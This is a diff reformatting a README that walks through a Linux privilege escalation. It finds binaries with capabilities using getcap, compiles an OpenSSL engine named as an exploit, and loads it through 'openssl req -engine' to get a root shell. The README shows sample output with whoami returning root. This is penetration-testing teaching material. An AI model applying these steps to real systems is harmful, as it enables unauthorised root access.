@@ -11,11 +11,11 @@ yes... yes there is a way.
 ## Search all the binaries' capibilities using: 
 ```
 getcap -r / 2>/dev/null.
-
-getcap is the tool we will use
+```
+> getcap is the tool we will use
 -r is the recursive flag
 2>/dev/null directs the standard error stream to /dev/null
-```
+
 
 If you see /usr/bin/openssl = cap_setuid+ep, we are set for success.
 
@@ -37,7 +37,7 @@ static int bind(ENGINE *e, const char *id)
 IMPLEMENT_DYNAMIC_BIND_FN(bind)
 IMPLEMENT_DYNAMIC_CHECK_FN()
 ```
-Check the [2] reference for more information.
+Check reference number 2  below for more information.
 
 ## 3. Compiling
 Run the following:
@@ -46,9 +46,9 @@ gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
 ```
 It is safe to ignore warnings below:
 
-implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+> implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
 
-implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+> implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
 
 Next run:
 ```
@@ -61,7 +61,7 @@ Once you have the file, run the following, at the location of the so file.
 
 openssl req -engine <full path to openssl-exploit-engine.so file>
 
-Sample output
+Sample output if openssl-exploit-engine.so is located in the /tmp directory
 
 user@server:~$ openssl req -engine /tmp/openssl-exploit-engine.so
 root@server:~# whoami
@@ -70,19 +70,15 @@ root
 Enjoy!
 
 ## Common Errors
-```
-fatal error: openssl/engine.h: No such file or directory #include <openssl/engine.h>
+> fatal error: openssl/engine.h: No such file or directory #include <openssl/engine.h>
   
 Fix by installing libssl-dev (sudo apt-get install libssl-dev)
-```
-
-If you get this error, check the section on Requirements.
 
 ## 7. References
 
-[1] Read up more on capabilities. 
+1. Read up more on capabilities. 
   https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities
-[2] OpenSSL building a useless engine
+2. OpenSSL building a useless engine
   https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/
-[3] How to use the library load feature OpenSSL
+3. How to use the library load feature OpenSSL
   https://gtfobins.github.io/gtfobins/openssl/#library-load
